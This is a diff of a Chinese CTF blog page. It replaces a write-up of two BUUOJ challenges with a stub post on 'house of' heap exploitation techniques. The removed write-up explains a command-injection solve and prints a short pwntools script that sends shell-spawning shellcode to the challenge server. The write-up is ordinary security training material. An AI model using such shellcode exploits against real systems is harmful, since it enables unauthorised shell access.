@@ -6,12 +6,13 @@
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>buu06 - ShouCheng</title>
+  <title>house of系列 - ShouCheng</title>
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="google" content="notranslate" />
   
-  <meta name="description" content="bjdctf_2020_router常规checkse...">
+  <meta name="description" content=" 该系列内容较多，将会在较长时间持续更新
+house ...">
   <meta name="author" content="ShouCheng">
   <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
   <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
@@ -147,7 +148,7 @@
         <i class="iconfont iconsearch j-navbar-search"></i>
       
     </div>
-    <div class="center">buu06</div>
+    <div class="center">house of系列</div>
     <div class="right">
       <i class="iconfont iconmenu j-navbar-menu"></i>
     </div>
@@ -191,51 +192,37 @@
     <section class="head">
   <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
   <div class="head-mask">
-    <h1 class="head-title">buu06</h1>
+    <h1 class="head-title">house of系列</h1>
     <div class="head-info">
-      <span class="post-info-item"><i class="iconfont iconcalendar"></i>June 05, 2021</span>
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>July 27, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>622</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>50</span>
     </div>
   </div>
 </section>
     <section class="main">
       <section class="content">
-        <h3 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p>
-<p><img   class="lazyload" data-original="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210605121040.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>只开启了NX</p>
-<p>进入ida看看代码</p>
-<p><img   class="lazyload" data-original="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210605121308.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>第一个功能很神奇的让我们输入一个长度为0x10的数据，然后用system调用？我跑去nc了一下</p>
-<p><img   class="lazyload" data-original="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210605121007.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>好吧，成功获得flag了。</p>
-<h3 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h3><p>checksec一下<img   class="lazyload" data-original="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614103954.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>保护都没开启，拖入ida分析一下。无法F5反汇编，只能看汇编代码了。</p>
-<p><img   class="lazyload" data-original="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614104047.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p><img   class="lazyload" data-original="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614104037.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>有个vuln函数，里面有调用gets和puts两个函数，可以进行输入。再看其他代码，底下有个call eax，可以进行执行代码，看下eax的内容来自哪里</p>
-<p><img   class="lazyload" data-original="/2021/06/05/buu06/QQ%E5%9B%BE%E7%89%8720210614104610.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-
+        <p> 该系列内容较多，将会在较长时间持续更新</p>
+<h2 id="house-of-Roman"><a href="#house-of-Roman" class="headerlink" title="house of Roman"></a>house of Roman</h2><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2>
       </section>
       <section class="extra">
         
           <ul class="copyright">
   
     <li><strong>本文作者：</strong>ShouCheng</li>
-    <li><strong>本文链接：</strong><a href="http://example.com/2021/06/05/buu06/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;06&#x2F;05&#x2F;buu06&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;06&#x2F;05&#x2F;buu06&#x2F;index.html</a></li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;07&#x2F;27&#x2F;2021-07-27-house-of%E7%B3%BB%E5%88%97&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;07&#x2F;27&#x2F;2021-07-27-house-of%E7%B3%BB%E5%88%97&#x2F;index.html</a></li>
     <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
   
 </ul>
         
         
         
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li></ul> 
+
         
   <nav class="nav">
-    <a href="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E9%9B%86%E5%90%88/"><i class="iconfont iconleft"></i>bin链情况集合</a>
-    <a href="/2021/06/05/2021-06-14-buu06/">buu06<i class="iconfont iconright"></i></a>
+    <a></a>
+    <a href="/2021/07/20/2021-07-26-offbyone-null/">offbyone&null<i class="iconfont iconright"></i></a>
   </nav>
 
       </section>
@@ -255,7 +242,7 @@
           
   <aside class="toc-wrap">
     <h3 class="toc-title">文章目录：</h3>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#picoctf-2018-shellcode"><span class="toc-text">picoctf_2018_shellcode</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-Roman"><span class="toc-text">house of Roman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-text">house of orange</span></a></li></ol>
   </aside>
 
         
